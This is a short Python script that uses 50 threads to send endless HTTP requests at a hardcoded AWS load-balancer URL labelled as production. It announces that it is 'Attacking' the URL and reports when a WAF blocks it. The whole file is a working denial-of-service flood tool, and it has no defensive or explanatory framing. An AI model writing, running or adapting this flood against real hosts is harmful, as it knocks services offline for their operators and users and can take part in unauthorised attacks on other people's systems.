import concurrent.futures
import urllib.request
import urllib.error

URL = "http://prod-pai-env-lb-1228542498.us-east-1.elb.amazonaws.com/"

def spam():
    while True: 
        try:
            res = urllib.request.urlopen(URL, timeout=2)
            # print(f"Success: {res.getcode()}") # ปิดไว้จะได้ไม่รก
        except urllib.error.HTTPError as e:
            print(f"Blocked by WAF! Status: {e.code}")
        except Exception:
            pass

print(f"Attacking {URL} ... Press Ctrl+C to stop.")
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    for _ in range(50):
        executor.submit(spam)